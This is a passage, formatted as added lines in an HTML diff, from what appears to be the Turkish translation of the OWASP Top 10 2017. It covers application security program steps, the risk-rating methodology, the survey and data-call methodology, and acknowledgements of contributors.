+<tr class="even">
+<td>Kapsam ve Doğruluk</td>
+<td>Herşeyi test etmeye başlamak zorunda değilsiniz. Önemli olan şeyler üzerinde odaklanın ve doğrulama programınızı zamanla genişletin. Bu, otomatik olarak doğrulanan güvenlik savunmaları ve riskleri ile kapsanan uygulama ve API'lerin genişletilmesi anlamına gelmektedir. Amaç, tüm uygulama ve API'leriniz için gerekli güvenlik kontrollerinin sürekli olarak yapıldığı bir duruma kavuşmaktır.</td>
+</tr>
+<tr class="odd">
+<td>Bulguların Açık Bir Şekilde Raporlanması</td>
+<td>Güvenlik testlerinde ne kadar iyi olursanız olun, etkin bir şekilde raporlama yapmadığınız sürece bir fark oluşturmayacaktır. Uygulamanın nasıl çalıştığını anladığınızı göstererek güven kazanın. Düzgün bir dille nasıl istismar edilebileceğini açıklayınız ve bunu gerçek kılmak için bir saldırı senaryosu ekleyiniz. Açıklığın tespitinin ve istismarının ne kadar zor olduğu ve sonucunun ne kadar kötü olacağı ile ilgili gerçekçi bir tahminde bulunun. Son olarak, sonuçları PDF dosyaları olarak değil geliştirme takımlarının hali hazırda kullandığı araçlar üzerinden teslim edin.</td>
+</tr>
+</tbody>
+</table>
+<h1 id="o-kurumlar-i̇çin-bir-sonraki-adım">+O Kurumlar İçin Bir Sonraki Adım</h1>
+<h2 id="uygulama-güvenliği-programınıza-şimdi-başlayın">Uygulama Güvenliği Programınıza Şimdi Başlayın</h2>
+<p>Uygulama güvenliği artık opsiyonel değildir. Artan saldırılar ve düzenleyici baskılar arasında, kurumlar uygulama ve API'lerinin güvenliğini sağlamak için etkin süreçler ve yetkinlikler oluşturmalıdır. Hali hazırda üretim ortamında olan uygulama ve API'lerin sahip olduğu aşırı düzeydeki kod miktarı düşünüldüğünde, pek çok kurum aşırı sayıdaki açıklıklar hakkında bilgi sahibi olmak için zorlanmaktadır.</p>
+<p>OWASP, kurumların uygulama ve API'lerinin günveliği hakkında bilgi sahibi olmaları ve güvenliklerini artırmaları için bir uygulama güvenliği programı oluşturmalarını tavsiye etmektedir. Uygulama güvenliğinin sağlanması, güvenlik ve denetim, yazılım geliştirme, iş geliştirme ve üst yönetim gibi bir kurumun farklı pek çok kısmının etkin bir şekilde beraber çalışmasını gerektirmektedir. Güvenlik gözlemlenebilir ve ölçülebilir olmalıdır, böylece tüm farklı oyuncular kurumun güvenlik algısını görebilir ve anlayabilir. Açıklıkları gerçekten ortadan kaldırarak veya etkilerini azaltarak kurum güvenliğinin geliştirilmesine yardım eden faaliyetlere ve sonuçlara odaklanın. <a href="https://owasp.org/www-project-samm/">OWASP SAMM</a> ve <a href="https://owasp.org/www-pdf-archive/Owasp-ciso-guide.pdf">CISO'lar İçin OWASP Uygulama Güvenliği Rehberi</a> bu listedeki pek çok önemli faaliyetin kaynağıdır.</p>
+<h3 id="başlayın">Başlayın</h3>
+<ul>
+<li>Tüm uygulamaları ve ilgili veri varlıklarını belgelendirin. Daha büyük kurumlar bu amaç için bir Yapılandırma Yönetimi Veri Tabanı (CMDB) oluşturmayı düşünmelidir.</li>
+<li>Bir <a href="https://owasp.org/www-project-samm/">uygulama güvenliği programı</a> oluşturun ve benimseyin.</li>
+<li>Ana gelişim alanlarını belirlemek için kurumunuzu benzer kurumlar ile kıyaslayarak bir <a href="https://owasp.org/www-project-samm/">yetkinlik açığı analizi</a> yapın ve yürütme planı hazırlayın.</li>
+<li>Yönetim onayı alın ve IT organizasyonunun tamamı için bir <a href="https://owasp.org/www-project-samm/">uygulama güvenliği farkındalık kampanyası</a> oluşturun.</li>
+</ul>
+<h3 id="risk-tabanlı-portfolyö-yaklaşımı">Risk Tabanlı Portfolyö Yaklaşımı</h3>
+<ul>
+<li>İş perspektifi ile <a href="https://owasp.org/www-project-samm/">uygulama portfolyönüzün</a> <a href="https://owasp.org/www-project-samm/">korunma ihtiyaçlarını</a> belirleyin. Bu işlem korunan veri varlığı ile ilgili gizlilik yasaları ve diğer düzenlemelere göre parça parça yapılmalıdır.</li>
+<li>Tutarlı bir olasılık seti ve kurumunuzun risk toleransını yansıtan etki faktörleri seti ile ortak bir <a href="https://owasp.org/www-community/OWASP_Risk_Rating_Methodology">risk derecelendirme modeli</a> oluşturun.</li>
+<li>Buna uygun olarak, tüm uygulama ve API'lerinizi ölçün ve önceliklendirin. Sonuçları CMDB veri tabanınıza ekleyin.</li>
+<li>Gereken özenin kapsamını ve düzeyini düzgün bir şekilde belirlemek için güvence yönergeleri oluşturun.</li>
+</ul>
+<h3 id="güçlü-bir-temele-oturtun">Güçlü Bir Temele Oturtun</h3>
+<ul>
+<li>Tüm geliştirme ekiplerinin uyması için bir uygulama güvenliği çizgisi oluşturacak odaklı bir <a href="https://owasp.org/www-project-samm/">politika ve standart</a> seti oluşturun.</li>
+<li>Bu politika ve standartlara uygun ve kullanımları hakkında tasarım ve geliştirme yönergeleri sağlayan ortak bir <a href="https://owasp.org/www-project-security-knowledge-framework/">tekrar kullanılabilir günvelik kontrolleri</a> seti tanımlayın.</li>
+<li>Zorunlu tutulacak ve farklı geliştirme rollerini ve konularını hedefleyecek bir <a href="https://owasp.org/www-project-samm/">uygulama güvenliği eğitimi içeriği</a> hazırlayın.</li>
+</ul>
+<h3 id="güvenliği-mevcut-süreçlerle-entegre-hale-getirin">Güvenliği Mevcut Süreçlerle Entegre Hale Getirin</h3>
+<ul>
+<li><a href="https://owasp.org/www-project-samm/">Güvenli uygulama</a> faaliyetlerini belirleyin ve bunları mevcut geliştirme ve operasyonel süreçlere entegre edin.</li>
+<li>Faaliyetler <a href="https://owasp.org/www-project-samm/">tehdit modellemeyi</a> ve çözümlerini içermektedir.</li>
+<li>Geliştirme ve proje takımlarının başarılı olması için ilgili konu uzmanlarını ve <a href="https://owasp.org/www-project-samm/">destek hizmetlerini</a> sağlayın.</li>
+</ul>
+<h3 id="yönetimsel-görülebilirliği-sağlayın">Yönetimsel Görülebilirliği Sağlayın</h3>
+<ul>
+<li>Metriklerle yönetin. Geliştirme ve destekleme kararlarını metriklere ve yakalanan analiz verilerine göre belirleyin. Metrikler güvenlik uygulama ve faaliyetlerine bağlılık, sunulan açıklıklar, çözülen açıklıklar, uygulama kapsamı, tip ve ortaya çıkma sayılarına göre açıklık yoğunluğu vb. içermektedir.</li>
+<li>Kök nedenlerin araştırılması için uygulama ve doğrulama faaliyetlerinden gelen verileri ve kurum çapında stratejik ve sistematik geliştirmeleri sağlamak için de açıklık kalıplarını analiz edin.</li>
+</ul>
+<h1 id="a-uygulama-yöneticileri-için-bir-sonraki-adım">+A: Uygulama Yöneticileri için Bir Sonraki Adım</h1>
+<h2 id="bütün-uygulama-yaşam-döngüsünü-yönetin">Bütün Uygulama Yaşam Döngüsünü Yönetin</h2>
+<p>Uygulamalar, insanların düzenli olarak oluşturduğu ve sürdürdüğü en karmaşık sistemlere aittir. Bir uygulama için IT yönetimi, bir uygulamanın bütün IT yaşam döngüsü için sorumlu olan IT uzmanları tarafından yapılmalıdır. Uygulama yöneticisi rolünün, uygulama sahibinin teknik karşılığı olarak oluşturulmasını öneriyoruz. Uygulama yöneticisi, gereksinimlerin toplanmasından sistemin kaldırılması sürecine kadarki genellikle gözden kaçırılan tüm uygulama yaşam döngüsünden sorumludur.</p>
+<h2 id="gereksinimler-ve-kaynak-yönetimi">Gereksinimler ve Kaynak Yönetimi</h2>
+<ul>
+<li>Tüm veri varlıklarının gizlilik, kimlik doğrulama, bütünlük ve erişilebilirlik ilkeleri ve beklenen iş mantığı ile ilgili korunma gereksinimleri dahil, bir uygulama için bulunan iş gereksinimleri toplanmalı ve görüşülmelidir.</li>
+<li>Fonksiyonel ve fonksiyonel olmayan güvenlik gereksinimleri dahil teknik gereksinimler toplanmalıdır.</li>
+<li>Güvenlik faaliyetleri dahil tasarım, geliştirme, test etme ve operasyonun tüm yönlerini kapsayan bütçe planlanmalı ve görüşülmelidir.</li>
+</ul>
+<h2 id="yorum-talepleri-rfp-ve-kontrat">Yorum Talepleri (RFP) ve Kontrat</h2>
+<ul>
+<li>Güvenlik programınız, örn. SDLC, en iyi kullanım örnekleri ile ilgili kılavuzlar ve tüm gereksinimler iç ve dış geliştiriciler ile görüşülmelidir.</li>
+<li>Planlama ve tasarım fazı dahil tüm teknik gereksinimlerin yerine getirilip getirilmediği takip edilmelidir.</li>
+<li>Tasarım, güvenlik ve hizmet seviyesi anlaşmaları (SLA) dahil tüm teknik gereksinimler görüşülmelidir.</li>
+<li><a href="https://owasp.org/www-community/OWASP_Secure_Software_Contract_Annex">OWASP Güvenli Yazılım Sözleşmesi Eki</a> gibi şablonlar ve kontrol listeleri benimsenmelidir. <strong>Not</strong>:Bu ek ABD sözleşme hukukuna göredir, bu yüzden örnek eki kullanmadan önce lütfen yetkin kişilerden yasal tavsiye alınız.</li>
+</ul>
+<h2 id="planlama-ve-tasarım">Planlama ve Tasarım</h2>
+<ul>
+<li>Geliştiriciler ve güvenlik uzmanları gibi iç paydaşlar ile planlama ve tasarım görüşülmelidir.</li>
+<li>Korunma ihtiyaçlarına ve beklenen tehdit düzeyine uygun güvenlik mimarisi, kontrolleri ve önlemleri belirlenmelidir.</li>
+<li>Uygulama sahibinin kalan riskleri kabul ettiğinden ve ilave kaynaklar sağladığından emin olunmalıdır.</li>
+<li>Her bir sprintte, fonksiyonel olmayan gereksinimler için eklenen kısıtlamaları içerecek güvenlik hikayelerinin oluşturulduğundan emin olunmalıdır.</li>
+</ul>
+<h2 id="dağıtım-test-ve-yaygınlaştırma">Dağıtım, Test ve Yaygınlaştırma</h2>
+<ul>
+<li>Uygulamanın, ara yüzlerin ve ihtiyaç duyulan yetkilendirmeler dahil tüm gerekli bileşenlerin güvenli dağıtımı otomatize edilmelidir.</li>
+<li>Teknik fonksiyonları ve IT mimarisi ile entegrasyon test edilmelidir ve iş testleri koordine edilmelidir.</li>
+<li>Teknik ve iş perspektiflerine göre "kullanım" ve "istismar" test senaryoları oluşturulmalıdır.</li>
+<li>Güvenlik testleri iç süreçlere, korunma ihtiyaçlarına ve uygulama tarafından varsayılan tehdit düzeyine göre yönetilmelidir.</li>
+<li>Uygulama aktif hale getirilmeli ve ihtiyaç duyulursa öncesinde kullanılan uygulamalara dönülmelidir.</li>
+<li>CMDB ve güvenlik mimarisi dahil tüm dokümantasyon son hale getirilmelidir.</li>
+</ul>
+<h2 id="operasyonlar-ve-değişiklik-yönetimi">Operasyonlar ve Değişiklik Yönetimi</h2>
+<ul>
+<li>Operasyonlar, uygulamanın güvenlik yönetimi için kılavuzlar (örn. yama yönetimi) içermelidir.</li>
+<li>Kullanıcıların güvenlik farkındalığı artırılmalı ve kullanılabilirlik ile güvenlik arasındaki çatışmazlıklar yönetilmelidir.</li>
+<li>Değişiklikler, örn. uygulamanın veya işletim sisteminin, ara katman ve kütüphaneler gibi diğer bileşenlerin yeni sürümlerine geçilmesi, planlanmalı ve yönetilmelidir.</li>
+<li>Değişiklik yönetimi veri tabanı (CMDB) dahil tüm dokümantasyon ve çalışma kitapları veya proje dokümantasyonu dahil güvenlik mimarisi, kontrolleri ve önlemleri güncellenmelidir.</li>
+</ul>
+<h2 id="eskiyen-sistemler">Eskiyen Sistemler</h2>
+<ul>
+<li>Tüm gerekli veriler arşivlenmelidir. Diğer tüm veriler güvenli bir şekilde silinmelidir.</li>
+<li>Kullanılmayan hesapların, rollerin ve izinlerin silinmesi ile beraber uygulama güvenli bir şekilde kaldırılmalıdır.</li>
+<li>CMDB veri tabanında uygulamanın durumu kaldırıldı olarak değiştirilmelidir.</li>
+</ul>
+<h1 id="r-riskler-hakkında-not">+R Riskler Hakkında Not</h1>
+<h2 id="zayıflıkların-temsil-ettiği-riskler-hakkında">Zayıflıkların Temsil Ettiği Riskler Hakkında</h2>
+<p>İlk 10 için Risk Derecelendirme metadolojisi <a href="https://owasp.org/www-community/OWASP_Risk_Rating_Methodology">OWASP Risk Derecelendirme Metadolojisi'ne</a> dayanmaktadır. İlk 10'da yer alan her bir kategori için, her bir ortak zayıflık için olasılık faktörlerine ve etki faktörlerine bakarak tipik bir web uygulamasında her bir zayıflığın oluşturacağı tipik riski tahmin ettik. Bir uygulamaya en önemli riski teşkil eden bu zayıflıklara göre sonrasında İlk 10 listesini tekrar sıraladık. Bu faktörler, her bir yeni İlk 10 sürümü ile bir şeyler değiştiğinde güncellenmektedir.</p>
+<p><a href="https://owasp.org/www-community/OWASP_Risk_Rating_Methodology">OWASP Risk Derecelendirme Metadolojisi</a> belirlenmiş bir açıklık için risk hesaplamasında yardımcı olmak için çok sayıda faktör tanımlamaktadır. Fakat, İlk 10 gerçek uygulama ve API'lerdeki belirli açıklıklardan ziyade genellenebilir açıklıklardan bahsetmelidir. Sonuç olarak, uygulamalar için risk hesaplanırken, hiçbir zaman uygulama sahipleri veya yöneticileri kadar net olamayacağız. Uygulamalarınızın ve verinizin önemi, tehditlerinizin ne olduğu ve sisteminizin nasıl geliştirildiği ve işletildiği konusunda hüküm vermek için en iyi donanıma sahip olan sizlersiniz.</p>
+<p>Metadolojimiz her bir zayıflık için üç olasılık faktörü (yaygınlık, tespit edilebilirlik ve istismarın kolaylığı) ve bir etki faktörü (teknik etki) içermektedir. Her bir faktöre özgü terminoloji ile risk her bir faktör için 1-Düşük ile 3-Yüksek arasında derecelenmektedir. Bir zayıflığın yaygınlığı, genellikle hesaplamak zorunda olmadığınız bir faktördür. Yaygınlık verisi için, (25. sayfadaki Teşekkürler kısmında bahsedildiği gibi) birtakım farklı kurumlardan yaygınlık istatistiği aldık ve yaygınlık açısından bir İlk 10 varoluş olasılığı listesi oluşturmak için bu verileri birleştirdik. Her bir zayıflık için bir olasılık oranı yapmak için daha sonra bu veriler dğer iki olasılık faktörü (tespit edilebilirlik ve istismarın kolaylığı) ile birleştirildi. Olasılık oranı, İlk 10 listesindeki her bir eleman için genel bir risk derecelendirmesi oluşturmak için her bir eleman için tahmin edilen ortalama teknik etki ile çarpılmıştır (sonuç yükseldikçe risk de artmaktadır). Tespit Edilebilirlik, İstismarın Kolaylığı ve Etki her bir İlk 10 kategorisi ile ilişkilendirilen ve raporlanan CVE'ler analiz edilerek hesaplanmıştır.</p>
+<p><strong>Not</strong>: Bu yaklaşım tehdit etkeni olasılığını hesaba katmamaktadır. Ayrıca belirli bir uygulamanız ile ilişkilendirilen çeşitli teknik detayların herhangi birisini de hesaba katmamaktadır. Bu faktörlerden herhangi birisi, saldırganın özel bir açıklığı bulması ve istismar etmesi olasılığını önemli derecede etkileyebilmektedir. Bu derecelendirme işiniz üzerindeki asıl etkiyi hesaba katmamaktadır. Kültürünüz, endüstri alanınız ve düzenleyici çevreniz düşünülerek, kurumunuz uygulama ve API'leri için kabul etmeye hazır olduğu güvenlik riski düzeyini belirlemek zorundadır. OWASP İlk 10 listesinin amacı sizin adınıza bu risk analizini yapmak değildir.</p>
+<p>Aşağıdaki tablo <strong>A6:2017-Yanlış Güvenlik Yapılandırması</strong> için risk hesaplamamızı göstermektedir.</p>
+<p><img src="images/0xc0-risk-explanation.png" alt="A6:2017-Yanlış Güvenlik Yapılandırması için Risk Hesaplaması" /></p>
+<h1 id="rf-risk-faktörleri-hakkında-detaylar">+RF Risk Faktörleri Hakkında Detaylar</h1>
+<h2 id="top-10-risk-faktörleri-özeti">Top 10 Risk Faktörleri Özeti</h2>
+<p>Aşağıdaki tablo 2017 İlk 10 Uygulama Güvenliği Risklerini ve herbir risk için belirlediğimiz risk faktörlerinin bir özetini sunmaktadır. Bu faktörler hazır bulunan istatistik verilerine ve OWASP İlk 10 takımının tecrübelerine göre belirlenmiştir. Belirli bir uygulama veya kurum özelinde bu riskleri anlamak için, kendi tehdit etkenlerinizi ve iş etkilerinizi düşünmelisiniz. Gerekli saldırıyı gerçekleştirmek için bir tehdit etkeni bulunmuyorsa veya varlıklar için iş etkisi ihmal edilebilirse, ciddi yazılım açıklıkları bile ciddi bir risk oluşturmayabilmektedir.</p>
+<p><img src="images/0xc1-risk-factor-table.png" alt="Risk Faktörleri Tablosu" /></p>
+<h2 id="düşünülmesi-gereken-i̇lave-riskler">Düşünülmesi Gereken İlave Riskler</h2>
+<p>İlk 10 pek çok risk grubunu kapsamaktadır, ancak kurumunuzda düşünmeniz ve değerlendirmeniz gereken başka pek çok risk bulunmaktadır. Sürekli olarak keşfedilen yeni saldırı teknikleri dahil bunlardan bazıları daha önceki İlk 10 sürümlerinde belirtilmişken, bazıları ise belirtilmemiştir. Düşünmeniz gereken ilave diğer önemli uygulama güvenliği riskleri (CWE-ID değerlerine göre sıralı) aşağıdakileri içermektedir:</p>
+<ul>
+<li><a href="https://cwe.mitre.org/data/definitions/352.html">CWE-352: Siteler Arası İstek Sahteciliği (CSRF)</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/400.html">CWE-400: Kontrolsüz Kaynak Tüketimi ('Kaynak Tüketimi', 'AppDoS')</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/434.html">CWE-434: Sınırsız Dosya Yükleme</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/451.html">CWE-451: Hassas Bilginin Kullanıcı Arayüzünde Yanlış Gösterimi (Clickjacking ve diğerleri)</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/601.html">CWE-601: Doğrulanmamış Yönlendirme ve İletme</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/799.html">CWE-799: Kontrolsüz Etkileşim Sıklığı (Anti-Otomasyon)</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/829.html">CWE-829: Güvenilmeyen Fonksiyon Kullanımı (3. Parti İçerik)</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Sunucu Taraflı İstek Sahteciliği (SSRF)</a></li>
+</ul>
+<h1 id="-veri-metadolojisi-ve-veriler">+ Veri Metadolojisi ve Veriler</h1>
+<p>OWASP Projesi Zirvesi'nde, aktif katılımcılar ve topluluk üyeleri, kısmen nicel veri ile kısmen de nitel anketler ile tanımlanan bir sıralama ile 2 yeni açıklık sınıfı ile bir açıklık listelemesi üzerinde ortak karar aldılar.  </p>
+<h2 id="endüstri-anketi">Endüstri Anketi</h2>
+<p>Anket için, eskiden "daha yeni çıkmış" olarak belirlenen veya İlk 10 e-posta listesinde 2017 RC1'a geri bildirim olarak gönderilen açıklık kategorilerini topladık. Bunları sıralanmış bir ankete yerleştirdik ve katılımcılardan Owasp İlk 10 - 2017 içerisinde yer alması gerektiğini düşündükleri ilk dört açıklığı sıralamasını istedik. Anket 2 Ağustos - 18 Eylül 2017 tarihleri arasında açık kaldı. 516 cevap toplandı ve açıklıklar sıralandı.</p>
+<table>
+<thead>
+<tr class="header">
+<th>Sıra</th>
+<th>Anket Açıklık Kategorileri</th>
+<th>Skor</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>1</td>
+<td>Gizli Bilgilerin İfşası ('Gizlilik İhlali') [CWE-359]</td>
+<td>748</td>
+</tr>
+<tr class="even">
+<td>2</td>
+<td>Kriptografik Eksiklikler [CWE-310/311/312/326/327]</td>
+<td>584</td>
+</tr>
+<tr class="odd">
+<td>3</td>
+<td>Güvenilmeyen Verinin Ters Serileştirilmesi [CWE-502]</td>
+<td>514</td>
+</tr>
+<tr class="even">
+<td>4</td>
+<td>Kullanıcı Tarafından Kontrol Edilen Anahtar İle Yetki Kaçağı (IDOR &amp; Path Traversal) [CWE-639]</td>
+<td>493</td>
+</tr>
+<tr class="odd">
+<td>5</td>
+<td>Yetersiz Loglama ve İzleme [CWE-223 / CWE-778]</td>
+<td>440</td>
+</tr>
+</tbody>
+</table>
+<p>Gizli Bilgilerin İfşası açık bir şekilde en yüksek sırada olan açıklıktır, ancak mevcut <strong>A3:2017-Hassas Bilgi İfşası</strong> maddesine ilave bir nokta olarak kolaylıkla uymaktadır. Kriptografik Eksiklikler Hassas Bilgi İfşası kategorisine uyabilmektedir. Güvensiz ters serileştirme üçüncü sırayı almıştır, bu yüzden risk derecelendirmesinden sonra <strong>A8:2017-Güvensiz Ters Serileştirme</strong> olarak İlk 10 listesine eklenmiştir. Dördüncü sırada bulunan Kullanıcı Kontrollü Anahtar <strong>A5:2017-Yetersiz Erişim Kontrolü</strong> kategorisi altında yer almıştır; bu açıklığın ankette yüksek sıralarda çıkması, yetkilendirme açıklıkları ile ilgili çok veri bulunmadığı için dikkat çekicidir. Ankette beşinci sırada yer alan açıklık, İlk 10 listesi için iyi bir madde olduğuna inandığımız ve bu yüzden <strong>A10:2017-Yetersiz Loglama &amp; İzleme</strong> olarak eklenen Yetersiz Loglama ve İzlemedir. Uygulamaların nelerin bir saldırı olabileceğini tanımlayabilmesini gerektiren ve uygun loglama, alarm üretme, yükselme ve cevap verme süreçlerini yürütmek zorunda kaldığı bir noktaya geçtik.</p>
+<h2 id="açık-veri-talebi">Açık Veri Talebi</h2>
+<p>Geleneksel olarak, toplanan ve analiz edilen veri daha çok yaygınlık verisidir: test edilen uygulamalarda kaç tane açıklık bulunmuştur. Bilindiği üzere, araçlar geleneksel olarak bulunan bir açıklığın görüldüğü tüm yerleri raporlarken, insanlar geleneksel olarak birkaç örnek ile beraber tek bir bulgu raporlamaktadır. Bu durum iki türdeki raporlamaların karşılaştırılabilir bir şekilde birleştirilmesini son derece zor kılmaktadır.</p>
+<p>2017 için, görülme oranı belirli bir açıklık türünü içeren ve verilen veri seti içerisinde bulunan uygulama sayısı ile hesaplanmıştır. Daha büyük iştirakçilerden gelen veri iki görünüm ile sağlanmıştır. Birincisi bulunan bir açıklığın bulunduğu her bir yerin sayılması ile yapılan geleneksel yaygınlık türündeyken, ikincisi açıklığın (bir veya daha fazla kez) bulunduğu uygulamaların sayısıdır. Mükemmel olmasa da, bu İnsan Destekli Araçlardan ve Araç Destekli İnsanlardan toplanan veriler arasında bir karşılaştırma yapabilme imkanı sunmuştur. Ham veriler ve analiz çalışmasına <a href="https://github.com/OWASP/Top10/tree/master/2017/datacall">Github üzerinden erişebilirsiniz</a>. Bu ilave yapıyı İlk 10 listesinin ileriki sürümleri için genişletmeyi düşünüyoruz.</p>
+<p>Veri talebi için kırkdan fazla gönderim aldık ve çoğu yaygınlığa odaklanan ilk veri talebinden geldiği için, 23 iştirakçiden gelen ve yaklaşık olarak 114.000 uygulamayı kapsayan veriyi kullanabildik. Mümkün olduğunda ve iştirakçiler tarafından belirtildiğinde, bir yıllık süre içerisinde bulunan yaygınlık verisini kullandık. Uygulamaların çoğunluğu birbirinden farklıydı, yine de Veracode tarafından verilen yıllık veriler arasında bazı tekrar eden uygulamaların olabileceği ihtimalini de kabul ediyoruz. Kullanılan 23 veri seti ya araç destekli insan testleri olarak belirlenmiştir ya da özel olarak insan destekli araçlar tarafından görülme oranı olarak sağlanmıştır. %100+ olaydaki seçilen verideki anomaliler en fazla %100 olacak şekilde ayarlanmıştır. Görülme oranını hesaplamak için, her bir açıklık türünü içeren toplam uygulamaların yüzdesini hesapladık. Görülme oranı İlk 10 sıralamasındaki nihai riskteki yaygınlık hesaplamasında kullanılmıştır.</p>
+<h1 id="teşekkürler-2">Teşekkürler</h1>
+<h2 id="veri-katkısında-bulunanlara-teşekkürler">Veri Katkısında Bulunanlara Teşekkürler</h2>
+<p>2017 güncellemesini desteklemek için açıklık verilerini sunarak katkıda bulunan sayısız kuruma teşekkür etmek istiyoruz:</p>
+<ul>
+<li>ANCAP</li>
+<li>Aspect Security</li>
+<li>AsTech Consulting</li>
+<li>Atos</li>
+<li>Branding Brand</li>
+<li>Bugcrowd</li>
+<li>BUGemot</li>
+<li>CDAC</li>
+<li>Checkmarx</li>
+<li>Colegio LaSalle Monteria</li>
+<li>Company.com</li>
+<li>ContextIS</li>
+<li>Contrast Security</li>
+<li>DDoS.com</li>
+<li>Derek Weeks</li>
+<li>Easybss</li>
+<li>Edgescan</li>
+<li>EVRY</li>
+<li>EZI</li>
+<li>Hamed</li>
+<li>Hidden</li>
+<li>I4 Consulting</li>
+<li>iBLISS Seguran̤a &amp; Intelig̻encia</li>
+<li>ITsec Security Services bv</li>
+<li>Khallagh</li>
+<li>Linden Lab</li>
+<li>M. Limacher IT Dienstleistungen</li>
+<li>Micro Focus Fortify</li>
+<li>Minded Security</li>
+<li>National Center for Cyber Security Technology</li>
+<li>Network Test Labs Inc.</li>
+<li>Osampa</li>
+<li>Paladion Networks</li>
+<li>Purpletalk</li>
+<li>Secure Network</li>
+<li>Shape Security</li>
+<li>SHCP</li>
+<li>Softtek</li>
+<li>Synopsis</li>
+<li>TCS</li>
+<li>Vantage Point</li>
+<li>Veracode</li>
+<li>Web.com</li>
+</ul>
+<p>İlk kez, bir İlk 10 sürümüne katkı olarak sunulan tüm verilere ve katkı sağlayanların tam listesine <a href="https://github.com/OWASP/Top10/tree/master/2017/datacall/submissions">herkes tarafından erişilebilmektedir</a>.</p>
+<h2 id="bireysel-olarak-katkı-sağlayanlara-teşekkürler">Bireysel Olarak Katkı Sağlayanlara Teşekkürler</h2>
+<p>Saatler harcayarak Github üzerinden İlk 10 projesine katkıda bulunan bireysel katkı sahiplerine de teşekkür etmek istiyoruz.</p>
+<ul>
+<li>ak47gen</li>
+<li>alonergan</li>
+<li>ameft</li>
+<li>anantshri</li>
+<li>bandrzej</li>
+<li>bchurchill</li>
+<li>binarious</li>
+<li>bkimminich</li>
+<li>Boberski</li>
+<li>borischen</li>
+<li>Calico90</li>
+<li>chrish</li>
+<li>clerkendweller</li>
+<li>D00gs</li>
+<li>davewichers</li>
+<li>drkknight</li>
+<li>drwetter</li>
+<li>dune73</li>
+<li>ecbftw</li>
+<li>einsweniger</li>
+<li>ekobrin</li>
+<li>eoftedal</li>
+<li>frohoff</li>
+<li>fzipi</li>
+<li>gebl</li>
+<li>Gilc83</li>
+<li>gilzow</li>
+<li>global4g</li>
+<li>grnd</li>
+<li>h3xstream</li>
+<li>hiralph</li>
+<li>HoLyVieR</li>
+<li>ilatypov</li>
+<li>irbishop</li>
+<li>itscooper</li>
+<li>ivanr</li>
+<li>jeremylong</li>
+<li>jhaddix</li>
+<li>jmanico</li>
+<li>joaomatosf</li>
+<li>jrmithdobbs</li>
+<li>jsteven</li>
+<li>jvehent</li>
+<li>katyanton</li>
+<li>kerberosmansour</li>
+<li>koto</li>
+<li>m8urnett</li>
+<li>mwcoates</li>
+<li>neo00</li>
+<li>nickthetait</li>
+<li>ninedter</li>
+<li>ossie-git</li>
+<li>PauloASilva</li>
+<li>PeterMosmans</li>
+<li>pontocom</li>
+<li>psiinon</li>
+<li>pwntester</li>
+<li>raesene</li>
+<li>riramar</li>
+<li>ruroot</li>
+<li>securestep9</li>
+<li>securitybits</li>
+<li>SPoint42</li>
+<li>sreenathsasikumar</li>
+<li>starbuck3000</li>
+<li>stefanb</li>
+<li>sumitagarwalusa</li>
+<li>taprootsec</li>
+<li>tghosth</li>
+<li>TheJambo</li>
+<li>thesp0nge</li>
+<li>toddgrotenhuis</li>
+<li>troymarshall</li>
+<li>tsohlacol</li>
+<li>vdbaan</li>
+<li>yohgaki</li>
+</ul>
+<p>Ve Twitter, e-posta ve diğer yöntemler ile geri bildirimde bulunan herkese.</p>
+<p>Dirk Watter, Jim Manico ve Osama Elnaggar'ın sağladıkları kapsamlı yardımlardan bahsetmeden geçmek haksızlık olurdu. Ayrıca, Chris Frohoff ve Gabriel Lawrence yeni A8:2017-Güvensiz Ters Serileştirme açıklığının yazımı için paha biçilemez bir katkı sağlamışlardır.</p>
+</body>
+</html>
